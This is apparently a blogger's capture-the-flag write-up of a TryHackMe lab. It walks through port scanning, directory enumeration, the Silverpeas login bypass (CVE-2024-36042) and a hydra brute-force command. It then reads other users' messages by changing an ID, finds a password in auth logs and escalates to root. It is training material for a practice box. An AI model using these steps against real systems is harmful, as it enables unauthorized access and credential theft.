---
title: "TryHackMe: Silver Platter"
author: neovirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_silver_platter/
image:
  path: room_img.png
description: Silver Platter is a beginner-friendly TryHackMe room focused on web exploitation and Linux privilege escalation. You’ll scan for open ports, exploit a vulnerable web app (Silverpeas), harvest credentials, and escalate privileges to root. It’s a great hands-on challenge to practice enumeration, brute-forcing, and basic hacking techniques.
---

# Silver Platter

**Created:** June 3, 2025 11:16 AM  


## Reconnaissance && Service Enumeration

```jsx
└─$ rustscan -a 10.10.31.240 -- -A
..
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.31.240:22
Open 10.10.31.240:80
Open 10.10.31.240:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.31.240
..
Scanning se.thm (10.10.31.240) [3 ports]
Discovered open port 22/tcp on 10.10.31.240
Discovered open port 80/tcp on 10.10.31.240
Discovered open port 8080/tcp on 10.10.31.240
Completed SYN Stealth Scan at 11:15, 0.15s elapsed (3 total ports)
Initiating Service scan at 11:15
..
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ0ia1tcuNvK0lfuy3Ep2dsElFfxouO3VghX5Rltu77M33pFvTeCn9t5A8NReq3felAqPi+p+/0eRRfYuaeHRT4=
|   256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKecigNtiy6tW5ojXM3xQkbtTOwK+vqvMoJZnIxVowju
80/tcp   open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
8080/tcp open  http-proxy syn-ack ttl 62
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 03 Jun 2025 15:15:57 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 03 Jun 2025 15:15:56 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
..
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E...
..
Uptime guess: 27.319 days (since Wed May  7 03:37:36 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   145.67 ms 10.9.0.1
2   145.74 ms se.thm (10.10.31.240)

NSE: Script Post-scanning.
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.14 seconds
           Raw packets sent: 89 (7.350KB) | Rcvd: 53 (4.628KB)

      
```

![Screenshot From 2025-06-03 11-45-47.png](img1.png)

![Screenshot From 2025-06-03 11-43-02.png](img2.png)

## Web Application Analysis

Checking `http://10.10.191.243/`  and    `http://10.10.191.243:8080/`

```jsx
┌──(neo㉿neo)-[~]
└─$ gobuster dir -u http://silver.thm/ -w /usr/share/wordlists/dirb/common.txt        
===============================================================
..
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://se.thm/assets/]
/images               (Status: 301) [Size: 178] [--> http://se.thm/images/]
/index.html           (Status: 200) [Size: 14124]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
                                                                                               
┌──(neo㉿neo)-[~]

```

The wordlist doesn't contain any useful words, so try generating a new list from the website's text content using the following command:

```bash
cewl http://silver.thm | tr 'A-Z' 'a-z' > password.txt
```

Try to find directorys 

```jsx
┌──(neo㉿neo)-[~/pro]
└─$ gobuster dir -u http://silver.thm/ -w password.txt  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silver.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                password.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 345 / 346 (99.71%)
===============================================================
Finished
===============================================================
                                                                                                                                              
┌──(neo㉿neo)-[~/pro]
└─$ gobuster dir -u http://silver.thm:8080/ -w password.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silver.thm:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                password.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/silverpeas           (Status: 302) [Size: 0] [--> http://silver.thm:8080/silverpeas/]
Progress: 345 / 346 (99.71%)
===============================================================
Finished
===============================================================
                                                                                                                                              
┌──(neo㉿neo)-[~/pro]
└─$ 

```

### login page

![Screenshot From 2025-06-03 13-59-04.png](img3.png)

![Screenshot From 2025-06-03 13-58-30.png](img4.png)

## Vulnerability

[**CVE-2024-36042 PoC**](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)

Basic bypass, by removing "Password" from the request.

## Exploit & Initial Access

```jsx
Login=scr1ptkiddy&DomainId=0
```

### or brute-force

> hydra -l scr1ptkiddy -P passwords.txt silver.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
> 

```jsx
$ hydra -l scr1ptkiddy -P password.txt silver.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-03 14:08:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 345 login tries (l:1/p:345), ~22 tries per task
[DATA] attacking http-post-form://silver.thm:8080/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect
[8080][http-post-form] host: silver.thm   login: scr1ptkiddy   password: ad[REDACTED]ng
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-03 14:09:03

```

![Screenshot From 2025-06-03 12-09-32.png](img5.png)

### Go to the notification area, open the inbox, and copy the URL from the address bar:

```bash
http://silver.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
```

Try changing the `ID` value (e.g., `ID=6`, `ID=7`, etc.) to access other users' inbox messages — such as the manager's inbox.

![Screenshot From 2025-06-03 14-17-57.png](img6.png)

### ssh Login

```jsx
┌──(neo㉿neo)-[~/pro]
└─$ ssh tim@silver.thm                                     
tim@silver.thm's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
..
Last login: Tue Jun  3 18:23:58 2025 from 10.9.2.128
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@silver-platter:~$ 
```

## Privilege Escalation

```jsx
tim@silver-platter:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
tyler:x:1000:1000:root:/home/tyler:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tim:x:1001:1001::/home/tim:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
tim@silver-platter:/home$ grep -iR tyler
grep: tyler: Permission denied
tim@silver-platter:/home$ cd /var/log
tim@silver-platter:/var/log$
```

Trying to find some database credentials, and we found one password for tyler

```jsx
tim@silver-platter:/var/log$ grep -iR tyler
grep: amazon: Permission denied
grep: wtmp: binary file matches
...
auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name 
postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
auth.log.2:Dec 13 15:40:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
......
tim@silver-platter:/var/log$ 
```

## Lateral Movement

```jsx
tim@silver-platter:~$ su tyler
Password: 
tyler@silver-platter:/home/tim$ cd /
tyler@silver-platter:/$ cd root
bash: cd: root: Permission denied
tyler@silver-platter:/$ sudo su
[sudo] password for tyler: 
root@silver-platter:/# cd root
root@silver-platter:~# ls
root.txt  snap  start_docker_containers.sh
root@silver-platter:~# cat root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
root@silver-platter:~# 
```
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
